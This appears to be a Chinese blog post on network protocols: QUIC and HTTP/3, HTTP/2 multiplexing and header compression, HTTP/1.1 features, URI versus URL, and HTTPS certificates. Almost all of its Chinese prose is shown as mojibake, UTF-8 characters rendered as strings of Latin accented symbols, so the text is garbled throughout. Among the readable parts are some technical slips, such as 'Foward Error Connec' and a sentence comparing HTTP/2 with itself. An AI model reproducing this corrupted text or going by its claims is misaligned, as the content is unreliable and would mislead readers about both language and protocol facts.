<p>Googleæäº†ä¸€ä¸ªåŸºäºUDPåè®®çš„QUICåè®®ï¼Œå¹¶ä¸”ä½¿ç”¨åœ¨äº†HTTP&#x2F;3ä¸Šï¼Œ HTTP&#x2F;3ä¹‹å‰çš„åç§°ä¸ºHTTP-over-QUICã€‚</p>
<p>æ—©æœŸQuicåè®®ï¼Œå­˜åœ¨IETFå’ŒGoogleä¸¤ä¸ªç‰ˆæœ¬ï¼Œç›´åˆ°å®ƒè¢«è¯å®å‘½åä¸ºHTTP3.0</p>
<p><strong>IETFçš„QUICå·¥ä½œå°ç»„åˆ›é€ äº†QUICä¼ è¾“åè®®ã€‚QUICæ˜¯ä¸€ä¸ªä½¿ç”¨UDPæ¥æ›¿ä»£TCPçš„åè®®ã€‚æœ€åˆçš„æ—¶å€™ï¼ŒGoogleå¼€å§‹åŠ©åŠ›QUICï¼Œå…¶åQUICæ›´å¤šåœ°è¢«å«åšâ€œHTTP&#x2F;2-encrypted-over-UDP â€œã€‚</strong></p>
<p><strong>ç¤¾åŒºä¸­çš„äººä»¬å·²ç»ä½¿ç”¨éæ­£å¼åç§°å¦‚iQUICå’ŒgQUICæ¥æŒ‡ä»£è¿™äº›ä¸åŒç‰ˆæœ¬çš„åè®®ï¼Œä»¥å°†QUICåè®®ä¸IETFå’ŒGoogleåˆ†å¼€(å› ä¸ºå®ƒä»¬åœ¨ç»†èŠ‚ä¸Šå·®å¼‚å¾ˆå¤§)ã€‚é€šè¿‡â€œiQUICâ€å‘é€HTTPçš„åè®®è¢«ç§°ä¸ºâ€œHQâ€(HTTP-over-QUIC)å¾ˆé•¿ä¸€æ®µæ—¶é—´ã€‚</strong></p>
<p><strong>2018å¹´11æœˆ7æ—¥ï¼ŒLitespeedçš„Dmitriå®£å¸ƒä»–ä»¬å’ŒFacebookå·²ç»æˆåŠŸåœ°å®Œæˆäº†ä¸¤ä¸ªHTTP&#x2F;3å®ç°ä¹‹é—´çš„ç¬¬ä¸€æ¬¡äº’æ“ä½œã€‚Mike Bihopåœ¨è¯¥ä¸»é¢˜çš„HTTPBISä¼šè¯ä¸­çš„åç»­ä»‹ç»å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°ã€‚ä¼šè®®ç»“æŸæ—¶è¾¾æˆå…±è¯†ç§°æ–°åç§°æ˜¯HTTP&#x2F;3!</strong></p>
<p><strong>0-RTT â€” QUICåè®®ç›¸æ¯”HTTP2.0çš„æœ€å¤§ä¼˜åŠ¿</strong></p>
<p>ç¼“å­˜å½“å‰ä¼šè¯çš„ä¸Šä¸‹æ–‡ï¼Œä¸‹æ¬¡æ¢å¤ä¼šè¯çš„æ—¶å€™ï¼Œåªéœ€è¦å°†ä¹‹å‰çš„ç¼“å­˜ä¼ é€’ç»™æœåŠ¡å™¨ï¼ŒéªŒè¯é€šè¿‡ï¼Œå°±å¯ä»¥è¿›è¡Œä¼ è¾“äº†ã€‚</p>
<p>0-RTTå»ºè¿å¯ä»¥è¯´æ˜¯QUICç›¸æ¯”HTTP2æœ€å¤§çš„æ€§èƒ½ä¼˜åŠ¿ã€‚</p>
<p>ä»€ä¹ˆæ˜¯0-RTTå»ºè¿?</p>
<ul>
<li>ä¼ è¾“å±‚0-RTTå°±èƒ½å»ºç«‹è¿æ¥</li>
<li>åŠ å¯†å±‚0-RTTå°±èƒ½å»ºç«‹åŠ å¯†è¿æ¥</li>
</ul>
<p><strong>å¤šè·¯å¤ç”¨</strong></p>
<p>QUICåŸºäºUDPï¼Œä¸€ä¸ªè¿æ¥ä¸Šçš„å¤šä¸ªstreamä¹‹é—´æ²¡æœ‰ä¾èµ–ï¼Œå³ä½¿ä¸¢åŒ…ï¼Œåªéœ€è¦é‡å‘ä¸¢å¤±çš„åŒ…å³å¯ï¼Œä¸éœ€è¦é‡ä¼ æ•´ä¸ªè¿æ¥ã€‚</p>
<p><strong>æ›´å¥½çš„ç§»åŠ¨ç«¯è¡¨ç°</strong></p>
<p>QUICåœ¨ç§»åŠ¨ç«¯çš„è¡¨ç°æ¯”TCPå¥½ï¼Œå› ä¸ºTCPæ˜¯åŸºäºIPè¯†åˆ«è¿æ¥ï¼Œè€ŒQUICæ˜¯é€šè¿‡IDè¯†åˆ«é“¾æ¥ã€‚ æ— è®ºç½‘ç»œç¯å¢ƒå¦‚ä½•å˜åŒ–ï¼Œåªè¦IDä¸ä¾¿ï¼Œå°±èƒ½è¿…é€Ÿé‡æ–°è¿ä¸Šã€‚</p>
<p><strong>åŠ å¯†è®¤è¯çš„æ ¹æ–‡ â€” æ­¦è£…åˆ°ç‰™é½¿</strong></p>
<p>TCPåè®®å¤´æ²¡æœ‰ç»è¿‡ä»»ä½•åŠ å¯†å’Œè®¤è¯ï¼Œåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å¾ˆå®¹æ˜“è¢«ä¸­é—´ç½‘ç»œè®¾å¤‡ç¯¡æ”¹ã€æ³¨å…¥å’Œçªƒå¬ã€‚</p>
<p>QUICçš„packetå¯ä»¥è¯´æ­¦è£…åˆ°äº†ç‰™é½¿ï¼Œé™¤äº†ä¸ªåˆ«æŠ¥æ–‡ï¼Œæ¯”å¦‚PUBLIC_RESETå’ŒCHLOï¼Œæ‰€æœ‰æŠ¥æ–‡å¤´éƒ¨éƒ½æ˜¯ç»è¿‡è®¤è¯çš„ï¼ŒæŠ¥æ–‡Bodyéƒ½æ˜¯ç»è¿‡åŠ å¯†çš„ã€‚</p>
<p>æ‰€ä»¥åªè¦å¯¹ QUIC åšä»»ä½•æ›´æ”¹ï¼Œæ¥æ”¶ç«¯éƒ½èƒ½åŠæ—¶å‘ç°ï¼Œæœ‰æ•ˆåœ°é™ä½äº†å®‰å…¨é£é™©ã€‚</p>
<p><strong>å‘å‰çº é”™æœºåˆ¶</strong></p>
<p>QUICåè®®æœ‰ä¸€ä¸ªéå¸¸ç‹¬ç‰¹çš„ç‰¹æ€§ï¼Œç§°ä¸ºå‘å‰çº é”™(Foward Error Connecï¼ŒFEC)ï¼Œæ¯ä¸ªæ•°æ®åŒ…é™¤äº†å®ƒæœ¬èº«çš„å†…å®¹ä¹‹å¤–è¿˜åŒ…æ‹¬äº†å…¶ä»–æ•°æ®åŒ…çš„æ•°æ®ï¼Œå› æ­¤å°‘é‡çš„ä¸¢åŒ…å¯ä»¥é€šè¿‡å…¶ä»–åŒ…çš„å†—ä½™æ•°æ®ç›´æ¥ç»„è£…è€Œæ— éœ€é‡ä¼ ã€‚</p>
<p>å‘å‰çº é”™ç‰ºç‰²äº†æ¯ä¸ªæ•°æ®åŒ…å¯ä»¥å‘é€æ•°æ®çš„ä¸Šé™ï¼Œä½†æ˜¯å¸¦æ¥çš„æå‡å¤§äºä¸¢åŒ…å¯¼è‡´çš„æ•°æ®é‡ä¼ ï¼Œå› ä¸ºæ•°æ®é‡ä¼ å°†ä¼šæ¶ˆè€—æ›´å¤šçš„æ—¶é—´(åŒ…æ‹¬ç¡®è®¤æ•°æ®åŒ…ä¸¢å¤±ï¼Œè¯·æ±‚é‡ä¼ ï¼Œç­‰å¾…æ–°æ•°æ®åŒ…ç­‰æ­¥éª¤çš„æ—¶é—´æ¶ˆè€—)ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>æˆ‘æ€»å…±å‘é€ä¸‰ä¸ªåŒ…ï¼Œåè®®ä¼šç®—å‡ºè¿™ä¸ªä¸‰ä¸ªåŒ…çš„å¼‚æˆ–å€¼å¹¶å•ç‹¬å‘å‡ºä¸€ä¸ªæ ¡éªŒåŒ…ï¼Œä¹Ÿå°±æ˜¯æ€»å…±å‘å‡ºäº†å››ä¸ªåŒ…ã€‚</li>
<li>å½“å…¶ä¸­å‡ºç°äº†éæ ¡éªŒåŒ…ä¸¢å¤±çš„æƒ…å†µï¼Œå¯ä»¥é€šè¿‡å¦å¤–ä¸‰ä¸ªåŒ…è®¡ç®—å‡ºä¸¢å¤±çš„æ•°æ®åŒ…çš„å†…å®¹ã€‚</li>
<li>å½“ç„¶è¿™ç§æŠ€æœ¯åªèƒ½ä½¿ç”¨åœ¨ä¸¢å¤±ä¸€ä¸ªåŒ…çš„æƒ…å†µä¸‹ï¼Œå¦‚æœå‡ºç°ä¸¢å¤±å¤šä¸ªåŒ…ï¼Œå°±ä¸èƒ½ä½¿ç”¨çº é”™æœºåˆ¶äº†ï¼Œåªèƒ½ä½¿ç”¨é‡ä¼ çš„æ–¹å¼äº†ã€‚</li>
</ul>
<p>HTTP2.0ä½¿ç”¨äº†å¤šè·¯å¤ç”¨çš„æŠ€æœ¯ï¼Œåšåˆ°åŒä¸€ä¸ªè¿æ¥å¹¶å‘å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œè€Œä¸”å¹¶å‘è¯·æ±‚çš„æ•°é‡æ¯”HTTP1.1å¤§äº†å¥½å‡ ä¸ªæ•°é‡çº§ã€‚HTTP1.1ä¹Ÿå¯ä»¥å¤šå»ºç«‹å‡ ä¸ªTCPè¿æ¥ï¼Œæ¥æ”¯æŒå¤„ç†æ›´å¤šå¹¶å‘çš„è¯·æ±‚ï¼Œä½†æ˜¯åˆ›å»ºTCPè¿æ¥æœ¬èº«ä¹Ÿæ˜¯æœ‰å¼€é”€çš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848907.jpeg" alt="img"></p>
<p>â€‹    HTTP1.1ä¸æ”¯æŒheaderæ•°æ®çš„å‹ç¼©ï¼ŒHTTP2.0ä½¿ç”¨HPACKç®—æ³•å¯¹headerçš„æ•°æ®è¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·æ•°æ®ä½“ç§¯å°äº†ï¼Œåœ¨ç½‘ç»œä¸Šä¼ è¾“å°±ä¼šæ›´å¿«ã€‚</p>
<p> ä¸ºäº†æ”¹å–„å»¶è¿Ÿï¼ŒHTTP2.0å¼•å…¥äº†server pushï¼Œå®ƒå…è®¸æœåŠ¡ç«¯æ¨é€èµ„æºç»™æµè§ˆå™¨ï¼Œåœ¨æµè§ˆå™¨æ˜ç¡®åœ°è¯·æ±‚ä¹‹å‰ï¼Œå…å¾—å®¢æˆ·ç«¯å†æ¬¡åˆ›å»ºè¿æ¥å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ç«¯è·å–ã€‚è¿™æ ·å®¢æˆ·ç«¯å¯ä»¥ç›´æ¥ä»æœ¬åœ°åŠ è½½è¿™äº›èµ„æºï¼Œä¸ç”¨å†é€šè¿‡ç½‘ç»œã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848920.jpeg" alt="img"></p>
<ol>
<li><strong>é•¿è¿æ¥</strong> : <strong>åœ¨HTTP&#x2F;1.0ä¸­ï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯çŸ­è¿æ¥</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡è¯·æ±‚éƒ½è¦é‡æ–°å»ºç«‹ä¸€æ¬¡è¿æ¥ã€‚HTTP æ˜¯åŸºäºTCP&#x2F;IPåè®®çš„,æ¯ä¸€æ¬¡å»ºç«‹æˆ–è€…æ–­å¼€è¿æ¥éƒ½éœ€è¦ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹çš„å¼€é”€ï¼Œå¦‚æœæ¯æ¬¡è¯·æ±‚éƒ½è¦è¿™æ ·çš„è¯ï¼Œå¼€é”€ä¼šæ¯”è¾ƒå¤§ã€‚å› æ­¤æœ€å¥½èƒ½ç»´æŒä¸€ä¸ªé•¿è¿æ¥ï¼Œå¯ä»¥ç”¨ä¸ªé•¿è¿æ¥æ¥å‘å¤šä¸ªè¯·æ±‚ã€‚<strong>HTTP 1.1èµ·ï¼Œé»˜è®¤ä½¿ç”¨é•¿è¿æ¥</strong> ,é»˜è®¤å¼€å¯Connectionï¼š keep-aliveã€‚ <strong>HTTP&#x2F;1.1çš„æŒç»­è¿æ¥æœ‰éæµæ°´çº¿æ–¹å¼å’Œæµæ°´çº¿æ–¹å¼</strong> ã€‚æµæ°´çº¿æ–¹å¼æ˜¯å®¢æˆ·åœ¨æ”¶åˆ°HTTPçš„å“åº”æŠ¥æ–‡ä¹‹å‰å°±èƒ½æ¥ç€å‘é€æ–°çš„è¯·æ±‚æŠ¥æ–‡ã€‚ä¸ä¹‹ç›¸å¯¹åº”çš„éæµæ°´çº¿æ–¹å¼æ˜¯å®¢æˆ·åœ¨æ”¶åˆ°å‰ä¸€ä¸ªå“åº”åæ‰èƒ½å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚</li>
<li><strong>é”™è¯¯çŠ¶æ€å“åº”ç </strong> :åœ¨HTTP1.1ä¸­æ–°å¢äº†24ä¸ªé”™è¯¯çŠ¶æ€å“åº”ç ï¼Œå¦‚409ï¼ˆConflictï¼‰è¡¨ç¤ºè¯·æ±‚çš„èµ„æºä¸èµ„æºçš„å½“å‰çŠ¶æ€å‘ç”Ÿå†²çªï¼›410ï¼ˆGoneï¼‰è¡¨ç¤ºæœåŠ¡å™¨ä¸Šçš„æŸä¸ªèµ„æºè¢«æ°¸ä¹…æ€§çš„åˆ é™¤ã€‚</li>
<li><strong>ç¼“å­˜å¤„ç†</strong> :åœ¨HTTP1.0ä¸­ä¸»è¦ä½¿ç”¨headeré‡Œçš„If-Modified-Since,Expiresæ¥åšä¸ºç¼“å­˜åˆ¤æ–­çš„æ ‡å‡†ï¼ŒHTTP1.1åˆ™å¼•å…¥äº†æ›´å¤šçš„ç¼“å­˜æ§åˆ¶ç­–ç•¥ä¾‹å¦‚Entity tagï¼ŒIf-Unmodified-Since, If-Match, If-None-Matchç­‰æ›´å¤šå¯ä¾›é€‰æ‹©çš„ç¼“å­˜å¤´æ¥æ§åˆ¶ç¼“å­˜ç­–ç•¥ã€‚</li>
<li><strong>å¸¦å®½ä¼˜åŒ–åŠç½‘ç»œè¿æ¥çš„ä½¿ç”¨</strong> :HTTP1.0ä¸­ï¼Œå­˜åœ¨ä¸€äº›æµªè´¹å¸¦å®½çš„ç°è±¡ï¼Œä¾‹å¦‚å®¢æˆ·ç«¯åªæ˜¯éœ€è¦æŸä¸ªå¯¹è±¡çš„ä¸€éƒ¨åˆ†ï¼Œè€ŒæœåŠ¡å™¨å´å°†æ•´ä¸ªå¯¹è±¡é€è¿‡æ¥äº†ï¼Œå¹¶ä¸”ä¸æ”¯æŒæ–­ç‚¹ç»­ä¼ åŠŸèƒ½ï¼ŒHTTP1.1åˆ™åœ¨è¯·æ±‚å¤´å¼•å…¥äº†rangeå¤´åŸŸï¼Œå®ƒå…è®¸åªè¯·æ±‚èµ„æºçš„æŸä¸ªéƒ¨åˆ†ï¼Œå³è¿”å›ç æ˜¯206ï¼ˆPartial Contentï¼‰ï¼Œè¿™æ ·å°±æ–¹ä¾¿äº†å¼€å‘è€…è‡ªç”±çš„é€‰æ‹©ä»¥ä¾¿äºå……åˆ†åˆ©ç”¨å¸¦å®½å’Œè¿æ¥ã€‚</li>
</ol>
<p><strong>é—®é¢˜å½’çº³</strong></p>
<p><strong>HTTP1.1çš„åˆå¹¶è¯·æ±‚(å¦‚CSSsprites)æ˜¯å¦é€‚ç”¨äºHTTP2.0</strong></p>
<p>æ²¡æœ‰å¿…è¦ã€‚</p>
<p>åœ¨å¤´éƒ¨å‹ç¼©æŠ€æœ¯ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å‡ä¼šç»´æŠ¤ä¸¤ä»½ç›¸åŒçš„é™æ€å­—å…¸å’ŒåŠ¨æ€å­—å…¸ã€‚</p>
<p>åœ¨é™æ€å­—å…¸ä¸­ï¼ŒåŒ…å«äº†å¸¸è§çš„å¤´éƒ¨åç§°ä¸å€¼çš„ç»„åˆã€‚é™æ€å­—å…¸åœ¨é¦–æ¬¡è¯·æ±‚æ—¶å¯ä»¥ä½¿ç”¨ã€‚é‚£ä¹ˆç°åœ¨å¤´éƒ¨çš„å­—æ®µå°±å¯ä»¥è¢«ç®€å†™æˆé™æ€å­—å…¸ä¸­ç›¸åº”å­—æ®µçš„indexã€‚</p>
<p>è€ŒåŠ¨æ€å­—å…¸è·Ÿè¿æ¥çš„ä¸Šä¸‹æ–‡ç›¸å…³ï¼Œæ¯ä¸ªHTTP&#x2F;2è¿æ¥ç»´æŠ¤çš„åŠ¨æ€å­—å…¸ä¸å°½ç›¸åŒã€‚åŠ¨æ€å­—å…¸å¯ä»¥åœ¨è¿æ¥ä¸åœåœ°è¿›è¡Œæ›´æ–°ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŸæœ¬å®Œæ•´çš„HTTPæŠ¥æ–‡å¤´éƒ¨çš„é”®å€¼æˆ–å­—æ®µï¼Œç”±äºå­—å…¸çš„å­˜åœ¨ï¼Œç°åœ¨å¯ä»¥è½¬æ¢æˆç´¢å¼•indexï¼Œåœ¨ç›¸åº”çš„ç«¯å†è¿›è¡ŒæŸ¥æ‰¾è¿˜åŸï¼Œä¹Ÿå°±èµ·åˆ°äº†å‹ç¼©çš„ä½œç”¨ã€‚</p>
<p>æ‰€ä»¥ï¼Œ<strong>åŒä¸€ä¸ªé“¾æ¥ä¸Šäº§ç”Ÿçš„è¯·æ±‚å’Œå“åº”è¶Šå¤šï¼ŒåŠ¨æ€å­—å…¸ç´¯ç§¯å¾—è¶Šå…¨ï¼Œå¤´éƒ¨å‹ç¼©çš„æ•ˆæœä¹Ÿå°±è¶Šå¥½ï¼Œæ‰€ä»¥é’ˆå¯¹HTTP&#x2F;2ç½‘ç«™ï¼Œæœ€ä½³å®è·µæ˜¯ä¸è¦åˆå¹¶èµ„æºã€‚</strong></p>
<p>å¦å¤–ï¼ŒHTTP2.0å¤šè·¯å¤ç”¨ï¼Œä½¿å¾—è¯·æ±‚å¯ä»¥å¹¶è¡Œä¼ è¾“ï¼Œè€ŒHTTP1.1åˆå¹¶è¯·æ±‚çš„ä¸€ä¸ªåŸå› ä¹Ÿæ˜¯ä¸ºäº†é˜²æ­¢è¿‡å¤šçš„HTTPè¯·æ±‚å¸¦æ¥çš„é˜»å¡é—®é¢˜ã€‚è€Œç°åœ¨HTTP2.0å·²ç»èƒ½å¤Ÿå¹¶è¡Œä¼ è¾“äº†ï¼Œæ‰€ä»¥åˆå¹¶è¯·æ±‚ä¹Ÿå°±æ²¡æœ‰å¿…è¦äº†ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¦æœ‰HTTP3.0ï¼šHTTP&#x2F;2åº•å±‚TCPçš„å±€é™å¸¦æ¥çš„é—®é¢˜</strong></p>
<p>ç”±äºHTTP&#x2F;2ä½¿ç”¨äº†å¤šè·¯å¤ç”¨ï¼Œä¸€èˆ¬æ¥è¯´ï¼ŒåŒä¸€ä¸ªåŸŸåä¸‹åªéœ€è¦ä½¿ç”¨ä¸€ä¸ªTCPé“¾æ¥ï¼Œä½†å½“è¿™ä¸ªè¿æ¥ä¸­å‡ºç°äº†ä¸¢åŒ…çš„æƒ…å†µï¼Œå°±ä¼šå¯¼è‡´HTTP&#x2F;2çš„è¡¨ç°æƒ…å†µåå€’ä¸å¦‚HTTP&#x2F;2äº†ã€‚</p>
<p>åŸå› æ˜¯ï¼š åœ¨å‡ºç°ä¸¢åŒ…çš„é¢æƒ…å†µä¸‹ï¼Œæ•´ä¸ªTCPéƒ½è¦å¼€å§‹ç­‰å¾…é‡ä¼ ï¼Œå¯¼è‡´åé¢çš„æ‰€æœ‰æ•°æ®éƒ½è¢«é˜»å¡ã€‚</p>
<p>ä½†æ˜¯å¯¹äºHTTP&#x2F;1.1æ¥è¯´ï¼Œå¯ä»¥å¼€å¯å¤šä¸ªTCPè¿æ¥ï¼Œå‡ºç°è¿™ç§æƒ…å†µåªä¼šå½±å“å…¶ä¸­ä¸€ä¸ªè¿æ¥ï¼Œå‰©ä½™çš„TCPé“¾æ¥è¿˜å¯ä»¥æ­£å¸¸ä¼ è¾“æ•°æ®ã€‚</p>
<p>ç”±äºä¿®æ”¹TCPåè®®æ˜¯ä¸å¯èƒ½å®Œæˆçš„ä»»åŠ¡ã€‚</p>
<p><strong>å¦‚ä½•åœ¨Chromeä¸­å¯ç”¨ QUIC åè®®</strong></p>
<p>MTFåœ¨èµ„æºæœåŠ¡å™¨å’Œå†…å®¹åˆ†å‘èŠ‚ç‚¹éƒ½å·²ç»å¯ç”¨äº† HTTP3.0 åè®®ï¼Œæ ¹æ® ç”¨æˆ·æµè§ˆå™¨ å‘ä¸‹å…¼å®¹ï¼Œå¼ºçƒˆå»ºè®®æ‚¨åœ¨Chromeæµè§ˆå™¨å¼€å¯å®éªŒæ€§QUICKåè®®æ”¯æŒï¼Œä½“éªŒåŠ é€Ÿæ•ˆæœï¼š</p>
<p>åœ¨æµè§ˆå™¨åœ°å€æ ï¼šè¾“å…¥chrome:&#x2F;&#x2F;flags</p>
<p>æ‰¾åˆ°Experimental QUIC protocolï¼Œå°†Defaultæ”¹ä¸ºEnabled</p>
<h2 id="URIå’ŒURLçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ"><a href="#URIå’ŒURLçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ" class="headerlink" title="URIå’ŒURLçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ?"></a>URIå’ŒURLçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ?</h2><ul>
<li>URI(Uniform Resource Identifier) æ˜¯ç»Ÿä¸€èµ„æºæ ‡å¿—ç¬¦ï¼Œå¯ä»¥å”¯ä¸€æ ‡è¯†ä¸€ä¸ªèµ„æºã€‚</li>
<li>URL(Uniform Resource Location) æ˜¯ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼Œå¯ä»¥æä¾›è¯¥èµ„æºçš„è·¯å¾„ã€‚å®ƒæ˜¯ä¸€ç§å…·ä½“çš„ URIï¼Œå³ URL å¯ä»¥ç”¨æ¥æ ‡è¯†ä¸€ä¸ªèµ„æºï¼Œè€Œä¸”è¿˜æŒ‡æ˜äº†å¦‚ä½• locate è¿™ä¸ªèµ„æºã€‚</li>
</ul>
<p>URIçš„ä½œç”¨åƒèº«ä»½è¯å·ä¸€æ ·ï¼ŒURLçš„ä½œç”¨æ›´åƒå®¶åº­ä½å€ä¸€æ ·ã€‚URLæ˜¯ä¸€ç§å…·ä½“çš„URIï¼Œå®ƒä¸ä»…å”¯ä¸€æ ‡è¯†èµ„æºï¼Œè€Œä¸”è¿˜æä¾›äº†å®šä½è¯¥èµ„æºçš„ä¿¡æ¯ã€‚</p>
<h2 id="HTTP-å’Œ-HTTPS-çš„åŒºåˆ«ï¼Ÿ"><a href="#HTTP-å’Œ-HTTPS-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="HTTP å’Œ HTTPS çš„åŒºåˆ«ï¼Ÿ"></a>HTTP å’Œ HTTPS çš„åŒºåˆ«ï¼Ÿ</h2><ol>
<li><p><strong>ç«¯å£</strong> ï¼šHTTPçš„URLç”±â€œhttp:&#x2F;&#x2F;â€èµ·å§‹ä¸”é»˜è®¤ä½¿ç”¨ç«¯å£80ï¼Œè€ŒHTTPSçš„URLç”±â€œhttps:&#x2F;&#x2F;â€èµ·å§‹ä¸”é»˜è®¤ä½¿ç”¨ç«¯å£443ã€‚</p>
</li>
<li><p>å®‰å…¨æ€§å’Œèµ„æºæ¶ˆè€—ï¼š</p>
<p>HTTPåè®®è¿è¡Œåœ¨TCPä¹‹ä¸Šï¼Œæ‰€æœ‰ä¼ è¾“çš„å†…å®¹éƒ½æ˜¯æ˜æ–‡ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½æ— æ³•éªŒè¯å¯¹æ–¹çš„èº«ä»½ã€‚HTTPSæ˜¯è¿è¡Œåœ¨SSL&#x2F;TLSä¹‹ä¸Šçš„HTTPåè®®ï¼ŒSSL&#x2F;TLS è¿è¡Œåœ¨TCPä¹‹ä¸Šã€‚æ‰€æœ‰ä¼ è¾“çš„å†…å®¹éƒ½ç»è¿‡åŠ å¯†ï¼ŒåŠ å¯†é‡‡ç”¨å¯¹ç§°åŠ å¯†ï¼Œä½†å¯¹ç§°åŠ å¯†çš„å¯†é’¥ç”¨æœåŠ¡å™¨æ–¹çš„è¯ä¹¦è¿›è¡Œäº†éå¯¹ç§°åŠ å¯†ã€‚æ‰€ä»¥è¯´ï¼ŒHTTP å®‰å…¨æ€§æ²¡æœ‰ HTTPSé«˜ï¼Œä½†æ˜¯ HTTPS æ¯”HTTPè€—è´¹æ›´å¤šæœåŠ¡å™¨èµ„æºã€‚</p>
</li>
</ol>
<h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><h2 id="è¯ä¹¦ç­¾å‘æµç¨‹"><a href="#è¯ä¹¦ç­¾å‘æµç¨‹" class="headerlink" title="è¯ä¹¦ç­¾å‘æµç¨‹"></a>è¯ä¹¦ç­¾å‘æµç¨‹</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848929.jpg" alt="preview"></p>
<p>CAæŠŠè¯ä¹¦ç»™æµè§ˆå™¨å¼€å‘å•†ï¼Œè¯ä¹¦ä¸­åŒ…æ‹¬CAçš„å…¬é’¥å’Œä¸€äº›å…¶å®ƒä¿¡æ¯ï¼Œç”¨æˆ·ä¸‹è½½æµè§ˆå™¨é‡Œé¢å°±æœ‰å¾ˆå¤šCAè¯ä¹¦ã€‚å„å¤§ç½‘ç«™å°†è‡ªå·±çš„è¯ä¹¦äº¤ä¸ªCAï¼ŒCAæ ¸æŸ¥å…¶èº«ä»½åˆæ³•åç”¨è‡ªå·±çš„ç§é’¥ç»™ç½‘ç«™è¯ä¹¦ç­¾åã€‚ç”¨æˆ·ä½¿ç”¨æµè§ˆå™¨é“¾æ¥åˆ°ç½‘ç«™ã€‚åœ¨åŠ å¯†é“¾æ¥å»ºç«‹ä¹‹å‰ï¼Œç½‘ç«™é¦–å…ˆå°†è‡ªå·±çš„ç»è¿‡CAç­¾åçš„è¯ä¹¦å‘é€ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨é¦–å…ˆæ ¹æ®è¯¥è¯ä¹¦çš„ä¿¡æ¯ï¼Œå¦‚é‚£ä¸ªCAå¯¹å®ƒè¿›è¡Œäº†ç­¾åï¼Œç»“åˆæµè§ˆå™¨è‡ªå¸¦çš„CAçš„è¯ä¹¦ï¼Œå¯¹è¯¥ç­¾åè¯ä¹¦è¿›è¡ŒéªŒè¯ï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®å®šè¿™ä¸ªç½‘ç«™æ˜¯çœŸçš„ç½‘ç«™ã€‚éªŒè¯é€šè¿‡åï¼Œæµè§ˆå™¨å¼€å§‹å’Œç½‘ç«™å»ºç«‹å®‰å…¨é€šä¿¡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211904472.jpg" alt="img"></p>
<h3 id="HTTPSçš„ä¼˜ç‚¹å’Œç¼ºç‚¹"><a href="#HTTPSçš„ä¼˜ç‚¹å’Œç¼ºç‚¹" class="headerlink" title="HTTPSçš„ä¼˜ç‚¹å’Œç¼ºç‚¹"></a>HTTPSçš„ä¼˜ç‚¹å’Œç¼ºç‚¹</h3><p>ç”¨HTTPSåè®®ä¼šä½¿é¡µé¢çš„åŠ è½½æ—¶é—´å»¶é•¿è¿‘50%ï¼Œå¢åŠ 10%åˆ°20%çš„è€—ç”µï¼Œæ­¤å¤–ï¼ŒHTTPSåè®®è¿˜ä¼šå½±å“ç¼“å­˜ï¼Œå¢åŠ æ•°æ®å¼€é”€å’ŒåŠŸè€—ï¼Œç”šè‡³å·²æœ‰å®‰å…¨æªæ–½ä¹Ÿä¼šå—åˆ°å½±å“ä¹Ÿä¼šå› æ­¤è€Œå—åˆ°å½±å“; è¯ä¹¦å¾ˆè´µ;</p>
<p>è€Œä¸”HTTPSåè®®çš„åŠ å¯†èŒƒå›´ä¹Ÿæ¯”è¾ƒæœ‰é™ï¼Œåœ¨é»‘å®¢æ”»å‡»ã€æ‹’ç»æœåŠ¡æ”»å‡»ã€æœåŠ¡å™¨åŠ«æŒç­‰æ–¹é¢å‡ ä¹èµ·ä¸åˆ°ä»€ä¹ˆä½œç”¨ã€‚</p>
<p>æœ€å…³é”®çš„ï¼ŒSSLè¯ä¹¦çš„ä¿¡ç”¨é“¾ä½“ç³»å¹¶ä¸å®‰å…¨ï¼Œç‰¹åˆ«æ˜¯åœ¨æŸäº›å›½å®¶å¯ä»¥æ§åˆ¶CAæ ¹è¯ä¹¦çš„æƒ…å†µä¸‹ï¼Œä¸­é—´äººæ”»å‡»ä¸€æ ·å¯è¡Œã€‚æˆ–è€…ç”¨æˆ·ä¸»åŠ¨å¿½è§†æµè§ˆå™¨æé†’å»è®¿é—®, httpsä¹Ÿæ²¡æœ‰ç”¨;</p>
<p>httpsä¸ä¸€å®šå®‰å…¨</p>
<p>éœ€è¦å®‰è£…æ­£ç‰ˆæ“ä½œç³»ç»Ÿï¼›å®‰è£…æ­£ç‰ˆæµè§ˆå™¨ï¼Œä¸‹è½½æµè§ˆå™¨éªŒè¯md5ï¼Œhashï¼Œsumï¼›å®‰è£…æ€æ¯’è½¯ä»¶ï¼›ä¸è¦å®‰è£…ç¬¬ä¸‰æ–¹è¯ä¹¦ï¼›ç¬¬ä¸‰æ–¹æœºæ„ä¸å—ä¿¡çš„è¯æµè§ˆå™¨ä¼šæ‰“ä¸€ä¸ªå‰ï¼Œä½†æ˜¯ç”¨æˆ·å¯ä»¥æ‰§æ„å»è®¿é—®ï¼›</p>
